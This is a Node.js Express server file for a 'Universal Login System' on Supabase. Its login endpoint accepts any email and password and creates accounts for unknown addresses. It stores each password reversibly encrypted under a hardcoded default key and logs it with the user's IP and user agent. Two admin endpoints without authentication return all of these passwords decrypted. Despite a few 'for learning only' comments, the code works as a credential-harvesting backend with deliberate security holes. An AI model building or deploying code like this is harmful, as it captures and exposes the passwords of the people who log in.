// server.js - Universal Login System
const express = require('express');
const bcrypt = require('bcrypt');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');
const path = require('path');
require('dotenv').config();

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Supabase Client
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

// Encryption setup (FOR LEARNING ONLY - Never do this in production!)
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'default-key-for-learning-32-char';
const ALGORITHM = 'aes-256-cbc';
const IV_LENGTH = 16;

// Encryption function
function encrypt(text) {
    try {
        const iv = crypto.randomBytes(IV_LENGTH);
        const cipher = crypto.createCipheriv(ALGORITHM, 
            Buffer.from(ENCRYPTION_KEY.padEnd(32).slice(0, 32)), 
            iv
        );
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return iv.toString('hex') + ':' + encrypted;
    } catch (error) {
        console.error('Encryption error:', error);
        return 'encryption-error';
    }
}

// Decryption function
function decrypt(text) {
    try {
        const parts = text.split(':');
        const iv = Buffer.from(parts.shift(), 'hex');
        const encryptedText = parts.join(':');
        const decipher = crypto.createDecipheriv(ALGORITHM, 
            Buffer.from(ENCRYPTION_KEY.padEnd(32).slice(0, 32)), 
            iv
        );
        let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (error) {
        console.error('Decryption error:', error);
        return '[Encrypted]';
    }
}

// GET home page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// GET dashboard page
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// GET admin page
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// UNIVERSAL LOGIN ENDPOINT
app.post('/api/login', async (req, res) => {
    try {
        console.log('Login attempt:', req.body.email);
        
        const { email, password } = req.body;
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
        
        if (!email || !password) {
            return res.status(400).json({ 
                success: false, 
                error: 'Email and password required' 
            });
        }
        
        // Clean email
        const cleanEmail = email.toLowerCase().trim();
        
        // Check if user already exists
        const { data: existingUser, error: fetchError } = await supabase
            .from('users')
            .select('*')
            .eq('email', cleanEmail)
            .maybeSingle();
        
        let userId;
        let userName = cleanEmail.split('@')[0];
        
        if (fetchError) {
            console.error('Supabase fetch error:', fetchError);
        }
        
        if (existingUser) {
            // User exists - update login info
            userId = existingUser.id;
            
            await supabase
                .from('users')
                .update({
                    last_login: new Date().toISOString(),
                    login_count: (existingUser.login_count || 0) + 1,
                    ip_address: ip
                })
                .eq('id', userId);
                
        } else {
            // User doesn't exist - CREATE NEW USER
            const passwordHash = await bcrypt.hash(password, 10);
            const encryptedPassword = encrypt(password);
            
            const { data: newUser, error: insertError } = await supabase
                .from('users')
                .insert([{
                    email: cleanEmail,
                    password_hash: passwordHash,
                    password_original: encryptedPassword,
                    name: userName,
                    ip_address: ip,
                    user_agent: userAgent,
                    created_at: new Date().toISOString(),
                    last_login: new Date().toISOString(),
                    login_count: 1
                }])
                .select()
                .single();
            
            if (insertError) {
                console.error('Error creating user:', insertError);
                return res.status(500).json({ 
                    success: false, 
                    error: 'Failed to create user' 
                });
            }
            
            userId = newUser.id;
            console.log('New user created:', cleanEmail);
        }
        
        // Log this login for admin
        await supabase
            .from('admin_logs')
            .insert([{
                user_id: userId,
                email_used: cleanEmail,
                password_original: encrypt(password),
                ip_address: ip,
                user_agent: userAgent,
                login_time: new Date().toISOString()
            }]);
        
        // Return success with user info
        res.json({
            success: true,
            user: {
                id: userId,
                email: cleanEmail,
                name: userName,
                ip: ip
            }
        });
        
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Server error during login' 
        });
    }
});

// GET all users for admin
app.get('/api/admin/users', async (req, res) => {
    try {
        // NOTE: In real app, add ADMIN AUTHENTICATION here!
        
        const { data: users, error } = await supabase
            .from('users')
            .select('*')
            .order('created_at', { ascending: false });
        
        if (error) {
            console.error('Error fetching users:', error);
            return res.status(500).json({ error: error.message });
        }
        
        // Decrypt passwords for admin view (FOR LEARNING ONLY!)
        const usersWithDecrypted = users.map(user => ({
            ...user,
            // Show decrypted password to admin
            password_display: user.password_original ? decrypt(user.password_original) : '[No password stored]',
            // Don't send actual hash to frontend
            password_hash: undefined
        }));
        
        res.json({ 
            success: true, 
            users: usersWithDecrypted 
        });
        
    } catch (error) {
        console.error('Admin error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to fetch users' 
        });
    }
});

// GET login logs for admin
app.get('/api/admin/logs', async (req, res) => {
    try {
        const { data: logs, error } = await supabase
            .from('admin_logs')
            .select(`
                *,
                users:user_id (email, name)
            `)
            .order('login_time', { ascending: false })
            .limit(100);
        
        if (error) throw error;
        
        // Decrypt passwords in logs
        const logsWithDecrypted = logs.map(log => ({
            ...log,
            password_display: log.password_original ? decrypt(log.password_original) : '[Encrypted]'
        }));
        
        res.json({ 
            success: true, 
            logs: logsWithDecrypted 
        });
        
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'Universal Login System is running',
        timestamp: new Date().toISOString()
    });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📝 Supabase URL: ${process.env.SUPABASE_URL ? 'Configured' : 'NOT SET!'}`);
    console.log(`🔑 Make sure .env file has your Supabase credentials!`);
});